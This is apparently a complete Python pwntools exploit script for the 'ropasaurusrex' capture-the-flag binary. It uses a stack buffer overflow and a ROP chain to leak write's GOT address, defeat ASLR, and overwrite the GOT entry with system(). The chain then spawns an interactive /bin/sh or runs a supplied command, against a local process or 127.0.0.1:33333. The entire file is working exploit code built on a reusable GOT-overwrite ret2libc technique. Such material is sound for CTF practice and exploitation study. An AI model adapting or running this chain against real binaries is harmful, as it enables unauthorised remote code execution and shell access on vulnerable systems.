#!/usr/bin/env python

from pwn import *

# Important address (ASLR on, but useful for offset calculations)
# 0xf7613da0 <system>: 
# 0xf76ae9f0 <write>: 
# 0xf76ae980 <read>: 
systemAslrAddr = 0xf7613da0
writeAslrAddr  = 0xf76ae9f0
readAslrAddr   = 0xf76ae980

# GOT addresses
# 08049614 R_386_JUMP_SLOT   write@GLIBC_2.0
# 0804961c R_386_JUMP_SLOT   read@GLIBC_2.0
writeGotAddr = 0x08049614
readGotAddr = 0x0804961c

# PLT Addresses (dissasemble ropasaurusrex)
# 0804832c <read@plt>:
# 0804830c <write@plt>:
writePltAddr = 0x0804830c
readPltAddr = 0x0804832c

# Dynamic section address
dynamicSectionAddr = 0x08049530

# Address of pop-pop-pop-ret
# This gets us past all of the args of a previous function call
pppr = 0x080484b6

# Exploitation steps:
# Leak a GOT address to stdout
# read(stdin, write.plt, 4)       // to get system address
# read(stdin, emptybuf, 20)       // put string in .dynamic section
# call write                      // which will call system

bufferFluff = 'a' * 0x88

buffer = bufferFluff 
buffer += p32(0xdeadbeef)       # BP that function pops before ret
buffer += p32(writePltAddr)     # Address we will load into PC

# write() prologue is expecting a return address on stack for ret
buffer += p32(pppr)

# write(fd, buf, count) - Leak the write GOT address so we can defeat ASLR
buffer += p32(0x00000001)       # fd = 1 = stdout
buffer += p32(writeGotAddr)     # write GOT address
buffer += p32(0x00000004)       # 4-bytes long

buffer += p32(readPltAddr)
buffer += p32(pppr)

# read(fd, buf, count) - Get computed value for system(), overwrite GOT entry for write
buffer += p32(0x00000000)
buffer += p32(writeGotAddr)
buffer += p32(0x00000004)

buffer += p32(readPltAddr)
buffer += p32(pppr)

# read(fd, buf, count) - Get the shell command from the exploit script
buffer += p32(0x00000000)
buffer += p32(dynamicSectionAddr) # Read the string to send to shell from stdin
buffer += p32(0x00000010)

buffer += p32(writePltAddr)
buffer += p32(pppr)

# This is really going to be a call to system!!!
buffer += p32(dynamicSectionAddr)
buffer += p32(0xbeefface)         # Not used
buffer += p32(0xbeefface)         # Not used

buffer += p32(0xbeefface)         # Just let the app crash when we are done

log.info("Length of shell code = " + hex(len(buffer)))

# Do we connect to local instance of app for testing, or a remote instance?
if ( args['LOCAL']):
  app = process('./ropasaurusrex')
else:
  app = remote('127.0.0.1', 33333)

app.send(buffer)

sleep(1)
log.info("Going to receive leaked libc address")
leakedWriteLibCAddr = app.recvn(4)

if (leakedWriteLibCAddr == ''):
  log.warn("Application didn't send us an address, we are in deep doo doo")

writeAddr = u32(leakedWriteLibCAddr)

log.info("Write libc addr = " + hex(writeAddr))

systemAddr = writeAddr - (writeAslrAddr - systemAslrAddr)

log.info("System libc addr = " + hex(systemAddr))

app.send(p32(systemAddr))

if (args['CMD']):
  app.sendline(args['CMD'])
else:
  app.sendline('/bin/sh')

log.info("Now we wait....")

app.interactive()



